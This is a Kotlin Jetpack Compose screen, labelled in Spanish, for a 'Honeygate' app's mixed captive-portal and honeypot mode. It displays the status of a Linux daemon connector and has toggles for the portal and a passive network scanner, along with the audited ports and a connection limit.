fun Mode3MixedScenarioScreen(
  config: HoneygateConfigEntity,
  redTeamLogs: List<String>,
  onSaveConfig: (HoneygateConfigEntity) -> Unit,
  onOpenDaemonSettings: () -> Unit = {}
) {
  var maxConns by remember { mutableIntStateOf(config.maxAllowedConnections) }
  var portalActive by remember { mutableStateOf(config.portalBrandingActive) }
  var scannerActive by remember { mutableStateOf(config.networkScannerActive) }

  LazyColumn(
    modifier = Modifier.fillMaxSize(),
    verticalArrangement = Arrangement.spacedBy(10.dp),
    contentPadding = PaddingValues(bottom = 24.dp)
  ) {
    item {
      Card(
        modifier = Modifier.fillMaxWidth(),
        shape = RoundedCornerShape(10.dp),
        colors = CardDefaults.cardColors(containerColor = DarkSurface),
        border = androidx.compose.foundation.BorderStroke(1.dp, CyberCyan.copy(alpha = 0.4f))
      ) {
        Column(modifier = Modifier.padding(10.dp)) {
          Text("Modo 3: Mixto (Portal Cautivo + Honeypot Unificado)", fontWeight = FontWeight.Bold, color = CyberCyan, fontSize = 12.sp)
          Text("Tráfico legítimo con salida a internet bajo metadatos (Ley 25.326/26.388) coexistiendo con trampa señuelo.", fontSize = 10.sp, color = TextSecondary)
        }
      }
    }

    item {
      Card(
        modifier = Modifier.fillMaxWidth(),
        shape = RoundedCornerShape(10.dp),
        colors = CardDefaults.cardColors(containerColor = DarkSurface),
        border = androidx.compose.foundation.BorderStroke(1.dp, CyberGreen.copy(alpha = 0.4f))
      ) {
        Column(modifier = Modifier.padding(12.dp)) {
          Row(
            modifier = Modifier.fillMaxWidth(),
            horizontalArrangement = Arrangement.SpaceBetween,
            verticalAlignment = Alignment.CenterVertically
          ) {
            Row(
              verticalAlignment = Alignment.CenterVertically,
              horizontalArrangement = Arrangement.spacedBy(8.dp)
            ) {
              Icon(Icons.Default.Terminal, contentDescription = null, tint = CyberGreen, modifier = Modifier.size(20.dp))
              Text("Módulo 1: Daemon Linux (Control Perimetral)", fontWeight = FontWeight.Bold, color = TextPrimary, fontSize = 12.sp)
            }
            Text(
              text = if (config.daemonSyncEnabled) "CONECTOR ACTIVO" else "MODO LOCAL",
              fontSize = 9.sp,
              color = if (config.daemonSyncEnabled) CyberGreen else TextMuted,
              fontWeight = FontWeight.Bold
            )
          }

          Spacer(modifier = Modifier.height(6.dp))
          Text("Endpoint: ${config.daemonBaseUrl}", fontSize = 11.sp, fontFamily = FontFamily.Monospace, color = CyberCyan)
          Text("Autenticación: X-Auth-Token activo | Aislamiento kernel vía shutdown()", fontSize = 10.sp, color = TextSecondary)

          Spacer(modifier = Modifier.height(8.dp))
          OutlinedButton(
            onClick = onOpenDaemonSettings,
            modifier = Modifier.fillMaxWidth(),
            shape = RoundedCornerShape(8.dp),
            colors = ButtonDefaults.outlinedButtonColors(contentColor = CyberCyan),
            border = androidx.compose.foundation.BorderStroke(1.dp, CyberCyan)
          ) {
            Icon(Icons.Default.Settings, contentDescription = null, modifier = Modifier.size(14.dp))
            Spacer(modifier = Modifier.width(6.dp))
            Text("Configurar y Sincronizar Daemon Linux", fontSize = 11.sp)
          }
        }
      }
    }

    item {
      Card(
        modifier = Modifier.fillMaxWidth(),
        shape = RoundedCornerShape(10.dp),
        colors = CardDefaults.cardColors(containerColor = DarkSurface),
        border = androidx.compose.foundation.BorderStroke(1.dp, DarkBorder)
      ) {
        Column(modifier = Modifier.padding(12.dp)) {
          Text("Panel de Administración de Características Mixtas", fontWeight = FontWeight.Bold, color = TextPrimary, fontSize = 12.sp)
          Spacer(modifier = Modifier.height(8.dp))

          Row(
            modifier = Modifier.fillMaxWidth(),
            horizontalArrangement = Arrangement.SpaceBetween,
            verticalAlignment = Alignment.CenterVertically
          ) {
            Text("Portal de Autenticación Activo", fontSize = 11.sp, color = TextSecondary)
            Switch(
              checked = portalActive,
              onCheckedChange = {
                portalActive = it
                onSaveConfig(config.copy(portalBrandingActive = it))
              }
            )
          }

          Divider(color = DarkBorder, modifier = Modifier.padding(vertical = 4.dp))

          Row(
            modifier = Modifier.fillMaxWidth(),
            horizontalArrangement = Arrangement.SpaceBetween,
            verticalAlignment = Alignment.CenterVertically
          ) {
            Text("Escáner Pasivo de Red", fontSize = 11.sp, color = TextSecondary)
            Switch(
              checked = scannerActive,
              onCheckedChange = {
                scannerActive = it
                onSaveConfig(config.copy(networkScannerActive = it))
              }
            )
          }

          Divider(color = DarkBorder, modifier = Modifier.padding(vertical = 4.dp))

          Text("Puertos Auditados: ${config.activePortsAuditedCsv}", fontSize = 11.sp, color = CyberCyan, fontFamily = FontFamily.Monospace)
          Text("Límite de Conexiones Simultáneas: $maxConns", fontSize = 11.sp, color = TextPrimary)
        }
      }
    }
  }
}
